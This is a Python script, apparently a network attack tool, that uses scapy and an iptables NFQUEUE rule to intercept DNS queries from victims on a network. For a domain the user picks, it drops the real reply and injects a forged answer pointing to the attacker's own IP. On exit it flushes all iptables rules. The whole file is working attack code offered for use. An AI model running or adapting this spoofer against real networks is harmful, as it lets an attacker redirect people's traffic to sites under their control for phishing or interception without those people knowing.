#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb=0
#Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
#conf.checkIPaddr=0
import argparse
import nfqueue
import os

parser = argparse.ArgumentParser()
parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
args = parser.parse_args()
localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]

def dnsspoof_cb(payload):
	data = payload.get_data()
	pkt = IP(data)
	ip_layer = pkt[IP]
	dns_layer = pkt[DNS]
	if not pkt.haslayer(DNSQR):
		payload.set_verdict(nfqueue.NF_ACCEPT)
	else:
		print pkt[DNS].qd.qname
		if args.dnsspoof in pkt[DNS].qd.qname:
			print '[+] DNS request for %s found' % args.dnsspoof
			payload.set_verdict(nfqueue.NF_DROP)
			print '[+] Dropped real DNS response. Injecting the spoofed packet...'
			p = IP(dst=ip_layer.src, src=ip_layer.dst)/UDP(dport=ip_layer.sport, sport=ip_layer.dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
			send(p)
			print '[+] Sent spoofed packet for %s' % args.dnsspoof

def main():
	print '[*] Setting up iptables and starting the queue'
#	iptables -A OUTPUT just catches packets on the attacker's machine, -t nat -A PREROUTING just catches the victim
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
	q = nfqueue.queue()
	q.open()
	q.bind(socket.AF_INET)
	q.set_callback(dnsspoof_cb)
	q.create_queue(0)
	try:
		q.try_run()
	except KeyboardInterrupt:
		print "Exiting..."
		os.system('iptables -F')
		q.unbind(socket.AF_INET)
		q.close()
		sys.exit('Exited')

main()
